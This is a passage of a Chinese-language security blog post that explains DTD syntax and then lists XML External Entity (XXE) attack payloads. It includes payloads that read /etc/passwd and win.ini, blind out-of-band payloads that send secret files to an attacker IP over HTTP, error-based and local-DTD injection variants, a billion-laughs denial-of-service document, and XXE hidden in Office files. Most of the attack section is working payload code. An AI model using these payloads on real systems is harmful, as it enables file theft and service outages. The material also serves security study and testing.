2,…..)</li><li>元素内容次数：默认只出现一次。<ul><li>最少出现一个：(子元素名称+)</li><li>出现0次或多次：(子元素名称*)</li><li>出现0次或1次：(子元素名称?)</li><li>或：(message|body)</li></ul></li></ul></li><li>混合类别和元素内容：<ul><li>&lt;!ELEMENT note (#PCDATA|to|from|header|message)*&gt;</li></ul></li></ul><h3 id="DTD声明属性"><a href="#DTD声明属性" class="headerlink" title="DTD声明属性"></a>DTD声明属性</h3><p><code>&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</code></p><ul><li>属性：<ul><li>CDATA    值为字符数据 (character data)</li><li>(en1|en2|..)    此值是枚举列表中的一个值</li><li>ID    值为唯一的 id</li><li>IDREF    值为另外一个元素的 id</li><li>IDREFS    值为其他 id 的列表</li><li>NMTOKEN    值为合法的 XML 名称</li><li>NMTOKENS    值为合法的 XML 名称的列表</li><li>ENTITY    值是一个实体</li><li>ENTITIES    值是一个实体列表</li><li>NOTATION    此值是符号的名称</li><li>xml:    值是一个**预定义的 XML 值</li></ul></li><li>默认值：<ul><li>值    属性的默认值</li><li>#REQUIRED    属性值是必需的</li><li>#IMPLIED    属性不是必需的</li><li>#FIXED value    属性值是固定的</li></ul></li></ul><p>DTD声明：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT square EMPTY&gt;</span><br><span class="line">&lt;!ATTLIST square width CDATA &quot;0&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>XML使用：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">square</span> <span class="attr">width</span>=<span class="string">"100"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="DTD声明实体"><a href="#DTD声明实体" class="headerlink" title="DTD声明实体"></a>DTD声明实体</h3><p>命名实体(内部实体)：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code><br>外部实体：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code><br>参数实体：<code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</code>（只在DTD中有效）<br>外部参数实体：<code>&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code>（只在DTD中有效）</p><blockquote><p>声明外部实体/命名实体时，指定实体的名称及其替代文本。</p><p>替代文本可以包含字符实体、命名实体和元素等，但不包含参数实体。</p></blockquote><p>DTD声明：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">writer</span> "<span class="attr">Bill</span> <span class="attr">Gates</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">copyright</span> "<span class="attr">Copyright</span> <span class="attr">W3School.com.cn</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>//<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>?%<span class="attr">other_file</span>;"&gt;</span></span><br></pre></td></tr></table></figure></p><p>XML使用：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>参数实体DTD中使用：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % print "&lt;!ENTITY send SYSTEM 'http://x.x.x.x/xxe.xml?c=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure></p><h2 id="XXE分类"><a href="#XXE分类" class="headerlink" title="XXE分类"></a>XXE分类</h2><ol><li>经典XXE：外部实体可以引入</li><li>XXE盲注：没有回显或错误信息</li><li>报错XXE：通过报错信息获取</li><li>DOS攻击：用于不断循环实体变量，导致内存爆炸。</li></ol><h2 id="常用攻击payload"><a href="#常用攻击payload" class="headerlink" title="常用攻击payload"></a>常用攻击payload</h2><h3 id="0x01-经典XXE"><a href="#0x01-经典XXE" class="headerlink" title="0x01.经典XXE"></a>0x01.经典XXE</h3><p>使用<strong>外部实体</strong>进行文件读取。<br>条件：</p><ol><li>可以引用外部实体</li><li>服务器要回显结果</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>windows的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">   &lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>还可以使用<strong>外部参数实体</strong>+<strong>外部实体</strong>进行文件读取。<br>攻击者发受害者</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % xxe SYSTEM "http://xxxx/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">%xxe;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;evil;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者远程文件<code>evil.dtd</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">evil</span> <span class="attr">SYSTEM</span> “<span class="attr">file:</span>///<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>" &gt;</span></span><br></pre></td></tr></table></figure></p><p>这个就绕过了个弯子，没太大意思。</p><h3 id="0x02-XXE盲注"><a href="#0x02-XXE盲注" class="headerlink" title="0x02.XXE盲注"></a>0x02.XXE盲注</h3><p>使用<strong>远程dtd读取</strong>，<strong>外部参数实体</strong>，<strong>外部实体</strong>进行文件读取。<br>条件：</p><ol><li>可以使用外部实体</li><li>可以使用远程dtd读取</li><li>可以使用外部参数实体</li><li>受害者与攻击者远程机网络可达</li><li>需要有远程攻击机放置xml文件以及接受结果</li></ol><p>攻击者主机xml文件：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">home</span>/<span class="attr">webgoat</span>/<span class="attr">.webgoat-8.0.0.M25</span>/<span class="attr">XXE</span>/<span class="attr">secret.txt</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % print "&lt;!ENTITY send SYSTEM 'http://47.102.137.160:1234/xxe.xml?c=%file;'&gt;"&gt;</span><br><span class="line">%print;</span><br></pre></td></tr></table></figure></p><blockquote><p>这一部构造参数实体 print，再执行得到send命名实体是必要的。命名实体内部不会解析参数实体</p></blockquote><p>攻击者发送payload：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">'1.0'</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE RemoteDTD SYSTEM "http://47.102.137.160:1234/xxe.dtd" &gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入&amp;send;即可 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>发送payload2（绕一圈引入）：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://47.102.137.160:1234/xxe.dtd"&gt;</span></span><br><span class="line"><span class="meta">%dtd;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure></p><blockquote><p>这种盲注存在一个问题就是当读取的文件存在换行符时，读取文件结果只能读取到第一个换行符截止。暂时未找到解决方法。</p><p>但是报错注入没有这种问题。</p></blockquote><h4 id="一个疑问"><a href="#一个疑问" class="headerlink" title="一个疑问"></a>一个疑问</h4><p><strong>为啥不能不读取远程dtd，只把结果发送至远程？</strong></p><p>为什么需要引入外部dtd，不能够只把文件读取结果输出给外部服务器么？</p><p>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///c:/tmp/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % send SYSTEM &quot;http://47.102.137.160:1234/xxe.xml?c=&apos;%file;&apos;&quot;&gt;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;any text&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>这样子收到的结果就是<code>http://47.102.137.160:1234/xxe.xml?c=&#39;%file;&#39;</code>，file不会被替换成变量。</p><p>比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % print &quot;&lt;!ENTITY send SYSTEM &apos;http://47.102.137.160:1234/xxe.xml?c=%file;&apos;&gt;&quot;&gt;</span><br><span class="line">%print;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;comment&gt;</span><br><span class="line">&lt;text&gt;&amp;send;&lt;/text&gt;</span><br><span class="line">&lt;/comment&gt;</span><br></pre></td></tr></table></figure><p>这样就可以直接在外部读取到file<br>但事实是不可以的，主要是因为外部DTD允许我们在第二个实体中包含一个实体，但在内部DTD不允许这么做。<br>可以参考<a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank" rel="noopener">文章</a><br>这篇文案还说明了当无法读取到外部dtd文件时，利用本地dtd文件进行参数覆盖，读取文件</p><h4 id="2020-04-10更新-三层嵌套实体可绕过部分XML解析器"><a href="#2020-04-10更新-三层嵌套实体可绕过部分XML解析器" class="headerlink" title="2020/04/10更新 三层嵌套实体可绕过部分XML解析器"></a>2020/04/10更新 三层嵌套实体可绕过部分XML解析器</h4><p>上面提到之所以需要引入外部实体，是因为内部DTD不允许我们在实体中包含一个实体。</p><p>但是在<a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">Blind XXE详解与Google CTF一道题分析</a>一文中，作者发现了原本规定是<strong>内部DTD不允许我们在实体中包含一个实体</strong>，但是库在实现的时候只是不允许双层嵌套而已（也就是前面我们的payload）。</p><p>但是三层嵌套就可以了，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">    &lt;!ELEMENT message ANY&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % para1 SYSTEM "file:///c:/windows/win.ini"&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % para '</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; para2 "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http:///&amp;#x25;para1;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">        &amp;#x25;para2;</span></span><br><span class="line"><span class="meta">    '&gt;</span></span><br><span class="line"><span class="meta">    %para;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>这样会由于不存在路径形成报错注入。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gdoj3vy7x9j32730l2q54.jpg" alt="baocuo.png"></p><p>理论上来说应该是可以同样形成盲注的，本地靶机不可以，但是看到别人也是确实时成功的，等实战再试试一下。</p><p>盲注payload有点不一样，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % NUMBER '</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///d:/password.txt"&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;http://127.0.0.1:8081/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">        &amp;#x25;eval;</span></span><br><span class="line"><span class="meta">        &amp;#x25;error;</span></span><br><span class="line"><span class="meta">        '&gt;</span></span><br><span class="line"><span class="meta">    %NUMBER;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>any text<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x03-报错注入"><a href="#0x03-报错注入" class="headerlink" title="0x03.报错注入"></a>0x03.报错注入</h3><p>其实和盲注一样，只需要最后发送信息至一个不存在的地方就会产生附带路径的报错。<br>攻击者主机xml文件：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">home</span>/<span class="attr">webgoat</span>/<span class="attr">.webgoat-8.0.0.M25</span>/<span class="attr">XXE</span>/<span class="attr">secret.txt</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % print "&lt;!ENTITY send SYSTEM 'http://xxxx.xx.xx.x/xxe.xml?c=%file;'&gt;"&gt;</span><br><span class="line">%print;</span><br></pre></td></tr></table></figure></p><p>攻击者发送payload：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">'1.0'</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE RemoteDTD SYSTEM "http://47.102.137.160:1234/xxe.dtd" &gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入&amp;send;即可 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>或者使用一个file://协议也可</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">payload</span> <span class="attr">SYSTEM</span> “<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>”&gt;</span></span><br><span class="line">&lt;!ENTITY % param1 ‘&lt;!ENTITY % external SYSTEM “file:///nothere/%payload;”&gt;’&gt; %param1; </span><br><span class="line">%external;</span><br></pre></td></tr></table></figure><h3 id="0x04-DOS攻击"><a href="#0x04-DOS攻击" class="headerlink" title="0x04.DOS攻击"></a>0x04.DOS攻击</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE lolz [</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol "lol"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ELEMENT lolz (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x05-载体的扩展"><a href="#0x05-载体的扩展" class="headerlink" title="0x05.载体的扩展"></a>0x05.载体的扩展</h3><p>xml漏洞点不单单是一个参数输入，还可以是依托在其他格式的文件中，比如exel，pptx等。<br>参考<a href="https://xz.aliyun.com/t/5655" target="_blank" rel="noopener">先知文章</a></p><ol><li>改成zip后缀</li><li>修改\xl\worksheets\sheet1.xml</li><li>插入头，值内插入值</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY body SYSTEM "file:///etc/passwd"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span> <span class="attr">r</span>=<span class="string">"C2"</span> <span class="attr">s</span>=<span class="string">"15"</span> <span class="attr">t</span>=<span class="string">"s"</span>&gt;</span><span class="tag">&lt;<span class="name">v</span>&gt;</span>&amp;body<span class="tag">&lt;/<span class="name">v</span>&gt;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="使用oxml-xxe工具进行生成"><a href="#使用oxml-xxe工具进行生成" class="headerlink" title="使用oxml_xxe工具进行生成"></a>使用oxml_xxe工具进行生成</h4><p><a href="https://github.com/BuffaloWill/oxml_xxe" target="_blank" rel="noopener">oxml_xee</a>会形成一个web页面来辅助我们生成含有xxe payload的其他格式文件。</p><p>我们可以使用已有的<a href="https://github.com/0xdevalias/docker-oxml_xxe" target="_blank" rel="noopener">docker</a>来使用，原项目也有dockerfile。</p><p>在页面中主要有三种功能，</p><ol><li>Build a file：创建一个包含payload的文件，payload将生成在默认位置<ul><li>word：/word/document.xml</li><li>ppt：/presentation.xml</li><li>xls：/xl/workbook.xml</li></ul></li><li>String Replace in a File：在文件中替换特定字符串<code>§</code>成为payload。<ul><li>我们需要打开文件在特定位置输入<code>§</code>，然后上传替换成payload。</li><li>在上传文件后下载，需要在特定位置回显的地方可以用到</li></ul></li><li>Overwrite file inside DOCX/ETC.：指定替换固定文件<ul><li>除了默认位置，还可以修改[Content_Types].xml  、 _rels/下的文件</li></ul></li><li>还有查看生成文件，上传分析文件格式的功能。</li></ol><h3 id="0x06-json格式转换"><a href="#0x06-json格式转换" class="headerlink" title="0x06.json格式转换"></a>0x06.json格式转换</h3><p>修改<code>Content-Type: application/json</code>为<code>Content-Type: application/xml</code>查看服务端是否支持xml解析。</p><h3 id="0x07本地DTD文件注入"><a href="#0x07本地DTD文件注入" class="headerlink" title="0x07本地DTD文件注入"></a>0x07本地DTD文件注入</h3><p>当目标机器不能访问我们放置恶意DTD文件的服务器，同时又不没有回显不能使用经典XEE时，以上所有办法都会失效。</p><p>这时候我们可以引用服务端已经存在的DTD文件，去进行一个DTD文件注入，引入恶意payload。</p><p>假设服务器上存在一个<strong>sip-app_1_0.dtd</strong>:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">…</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">condition</span> "<span class="attr">and</span> | <span class="attr">or</span> | <span class="attr">not</span> | <span class="attr">equal</span> | <span class="attr">contains</span> | <span class="attr">exists</span> | <span class="attr">subdomain-of</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">pattern</span> (%<span class="attr">condition</span>;)&gt;</span></span><br><span class="line">…</span><br></pre></td></tr></table></figure><p>在这个已有的dtd文件中，定义了一个 %condition 参数实体，由于参数实体在dtd声明中都是简单的替换再解析，我们可以自定义一个%condition，然后就可以对<code>&lt;!ELEMENT pattern (%condition;)&gt;</code>这个语句进行注入。</p><blockquote><p>如果我们定义了两个同名的参数实体，那么只有第一个参数实体是有效的。</p></blockquote><p>构造如下代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd"&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % condition 'aaa)&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">        &amp;#x25;eval;</span></span><br><span class="line"><span class="meta">        &amp;#x25;error;</span></span><br><span class="line"><span class="meta">        &lt;!ELEMENT aa (bb'&gt;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>any text<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>对于% 进行了HTML编码</p><p>在调用%local_dtd时，sip-app_1_0.dtd才被引入，所以我们定义的%condition实体参数是第一个实体参数。</p></blockquote><p>调用 %local_dtd 就会执行我们拼接进入的语句，从而触发漏洞。</p><p>以上只是举个例子，知道原理后这种利用方式的关键在于如何找到对方服务器上可注入的dtd</p><h4 id="dtd-finder"><a href="#dtd-finder" class="headerlink" title="dtd-finder"></a>dtd-finder</h4><p>2019年7月，有国外大佬已经完美解决了这个问题，<a href="https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html" target="_blank" rel="noopener">戳这里</a></p><p>并提供了工具<a href="https://github.com/GoSecure/dtd-finder" target="_blank" rel="noopener">dtd-finder</a>，工具中具有已知漏洞的dtd列表文件</p><p>在测试时只需要遍历存在已知漏洞的dtd文件，查看是否存在，存在的话照着参数利用即可。</p><p>除了以上工具中的可注入dtd列表，还有此处额外两个路径</p><p><strong>Citrix XenMobile Server</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % Body &apos;&gt;Your DTD code&lt;!ENTITY test 